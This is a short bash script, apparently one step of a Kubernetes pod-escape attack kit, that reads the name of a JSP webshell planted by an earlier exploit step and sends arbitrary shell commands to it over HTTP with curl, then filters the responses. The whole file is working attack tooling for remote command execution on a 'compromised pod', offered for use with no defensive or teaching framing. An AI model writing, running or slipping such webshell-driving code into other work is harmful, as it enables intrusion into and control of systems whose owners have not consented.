#!/bin/bash
###############################################
# Helper: execute arbitrary commands on the
# compromised pod via the webshell
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
[ $# -lt 1 ] && echo "Usage: $0 <command>" && exit 1

# Read webshell info from step 1
SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_CTX=$(sed -n '3p' "$SHELL_FILE")
    if [ "$SHELL_CTX" = "ROOT" ]; then
        SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
    else
        SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
    fi
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

COMMAND="$@"
echo "> $COMMAND"
RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$COMMAND" "$SHELL_URL")
HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
    echo "ERROR: Webshell returned HTTP $HTTP_CODE. Re-run step 1."
    exit 1
fi
echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
    | tr -d '\0' \
    | sed '/^\s*$/d' \
    | grep -v 'java\.io\.InputStream' \
    | grep -v '^//\s*$' \
    | grep -v '^- $'
echo ""
